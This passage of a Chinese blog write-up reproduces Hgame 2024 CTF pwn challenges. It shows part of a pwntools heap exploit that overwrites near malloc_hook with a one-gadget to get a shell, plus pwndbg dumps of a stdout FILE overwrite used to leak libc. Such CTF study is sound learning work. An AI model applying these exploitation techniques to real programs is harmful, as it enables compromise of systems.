class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;9&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;10&#x27;</span>)<br><br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\xe1&#x27;</span>)<br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">7</span>)<br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br><br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;b&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook-<span class="hljs-number">0x23</span>))<br>add_note(<span class="hljs-number">1</span>,<span class="hljs-number">0x18</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br><span class="hljs-comment"># # gdb.attach(io)</span><br><span class="hljs-comment"># # pause()</span><br><br>delete_note(<span class="hljs-number">1</span>, <span class="hljs-number">13</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x71&#x27;</span>)  <span class="hljs-comment"># 这3个官方wp写的page是0 也不到是不是写错了 0/1都能通</span><br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add_note(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(onegadget))<br><br>add_page()<br><br><br>io.interactive()<br><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 00:0000│  0x602050 (PAGE_start) —▸ 0xbd4010 ◂— 0x0</span><br><span class="hljs-comment"># 01:0008│  0x602058 (NOTE_start) —▸ 0xbd4040 ◂— 0x0</span><br><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># delete(0, 8)后下断点</span><br>pwndbg&gt; x/50gx <span class="hljs-number">0x226e260</span><br><span class="hljs-number">0x226e260</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00000000000001e1</span><br><span class="hljs-number">0x226e270</span>:	<span class="hljs-number">0x00007772117c3b78</span>	<span class="hljs-number">0x00007772117c3b78</span><br><span class="hljs-number">0x226e280</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e290</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e2a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e2b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e2c0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e2d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e2e0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e2f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e300</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e310</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e320</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e330</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e340</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e350</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x226e360</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000071</span><br><span class="hljs-number">0x226e370</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><br>    <br>    <br>    <br>add_note(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x33</span>+p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x58&#x27;</span>) <span class="hljs-comment"># \x58是将_IO_write_base;	/* Start of put area. */的后两位改成了58也就是下图标注的那里</span><br>pwndbg&gt; x/30gx <span class="hljs-number">0x775a2a3c4620</span>-<span class="hljs-number">0x40</span><br><span class="hljs-number">0x775a2a3c45e0</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x0000775a2a3c3660</span>	<span class="hljs-number">0x6161610000000000</span><br><span class="hljs-number">0x775a2a3c45f0</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0x775a2a3c4600</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0x775a2a3c4610</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">208</span>&gt;:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0x775a2a3c4620</span> &lt;_IO_2_1_stdout_&gt;:	<span class="hljs-number">0x00000000fbad1800</span>	<span class="hljs-number">0x0000775a2a3c46a3</span><br><span class="hljs-number">0x775a2a3c4630</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000775a2a3c46a3</span>	<span class="hljs-number">0x0000775a2a3c46a3</span><br><span class="hljs-number">0x775a2a3c4640</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000775a2a3c46a3</span>	<span class="hljs-number">0x0000775a2a3c46a4</span><br><span class="hljs-number">0x775a2a3c4650</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">48</span>&gt;:    <span class="hljs-number">0x0000775a2a3c46a4</span>	<span class="hljs-comment">#0x0000775a2a3c46a3</span><br><span class="hljs-number">0x775a2a3c4660</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000775a2a3c46a4</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x775a2a3c4670</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x775a2a3c4680</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000775a2a3c38e0</span><br><span class="hljs-number">0x775a2a3c4690</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0xffffffffffffffff</span><br><span class="hljs-number">0x775a2a3c46a0</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0x000000000a000000</span>	<span class="hljs-number">0x0000775a2a3c5780</span><br><span class="hljs-number">0x775a2a3c46b0</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0xffffffffffffffff</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x775a2a3c46c0</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x0000775a2a3c37a0</span>	<span class="hljs-number">0x0000000000000000</span><br><br></code></pre></td></tr></table></figure>



<ul>
<li><p>还有一点就是跟出题有关吧</p>
<blockquote>
<p># Post author: Zchared @AkyOI<br># Post link: <a target="_blank" rel="noopener" href="https://blog.akyuu.space/2024/02/25/Pwn/IO_FILE/">https://blog.akyuu.space/2024/02/25/Pwn/IO_FILE/</a><br># Copyright Notice: All articles in this blog are licensed under (CC)BY-NC-SA unless stating additionally.</p>
<p>结构体比较复杂的 heap，看似 free 函数之后没有清空指针会有 uaf 漏洞，但是由于 chunk 之间采用链表链接，取出 chunk 也就没法遍历到了，所以就相当于清空指针的作用。而且创建指向内容的 chunk 的 chunk 在 malloc 之后也写入了新东西，所以没法直接 UAF。</p>
</blockquote>
</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Hgame2024复现</div>
      <div>https://yech0.github.io/2024/03/23/Hgame2024/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>yech0</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月23日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/10/ret2dlresolve/" title="re2dlresolve">
                        <span class="hidden-mobile">re2dlresolve</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxingxing.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
